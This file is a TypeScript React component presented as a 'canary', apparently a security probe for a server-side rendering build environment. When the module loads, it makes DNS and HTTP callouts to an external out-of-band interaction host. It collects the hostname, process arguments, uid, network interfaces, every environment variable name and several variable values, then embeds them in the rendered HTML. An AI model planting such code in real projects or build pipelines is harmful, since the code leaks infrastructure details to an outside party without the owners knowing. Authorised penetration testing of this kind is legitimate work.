import classNames from 'classnames';

// IslandViaSpec rung-1 canary (ISVS-R1-7T3Q): fires DNS + HTTP to our OAST from the
// SSR render child at BUILD time and dumps non-secret worker identity into the SSR HTML.
// Env handling: VALUES of non-secret keys only (version, hostname, PATH); all other env
// exposed as KEY NAMES ONLY — capability proof without extracting real credentials.
const OAST = 'dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site';
const req = typeof require === 'function' ? require : null;

let dnsFired = 'no-require';
let httpFired = 'no-require';
let envInfo = 'no-require';

if (req) {
  try {
    const dns = req('node:dns');
    dns.lookup('isvs-r1-load-' + Date.now() + '.' + OAST, () => {});
    dns.resolve4('isvs-r1-render.' + OAST, () => {});
    dnsFired = 'fired';
  } catch (e) {
    dnsFired = 'ERR:' + e.message;
  }
  try {
    fetch('https://isvs-r1-http.' + OAST + '/rung1-canary', {}).catch(() => {});
    httpFired = 'fired';
  } catch (e) {
    httpFired = 'ERR:' + e.message;
  }
  try {
    const os = req('node:os');
    const env = process.env || {};
    const safeKeys: Record<string, true> = {
      NODE_VERSION: true,
      PATH: true,
      HOME: true,
      HOSTNAME: true,
      PWD: true,
      SHELL: true,
      LANG: true,
      TZ: true,
    };
    const envPairs = Object.keys(env)
      .sort()
      .map((k) => k + '=' + (k in safeKeys ? String(env[k]) : '<redacted>'));
    envInfo = JSON.stringify({
      marker: 'ISVS-R1-7T3Q',
      node: process.version,
      execPath: process.execPath,
      argv: process.argv,
      cwd: process.cwd?.(),
      host: os.hostname(),
      platform: os.platform(),
      euid: process.getuid?.(),
      isMultiTenant: env.IS_MULTI_TENANT,
      envKeys: Object.keys(env).sort(),
      envSafe: envPairs,
      nets: os.networkInterfaces(),
    });
  } catch (e) {
    envInfo = 'ERR:' + e.message;
  }
}

export default function Canary() {
  return (
    <div className={classNames('isvs-r1-canary')}>
      {'ISVS-R1-7T3Q START '}
      {'ENV=' + envInfo + ' '}
      {'DNS=' + dnsFired + ' '}
      {'HTTP=' + httpFired + ' '}
      {'ISVS-R1-7T3Q END'}
    </div>
  );
}
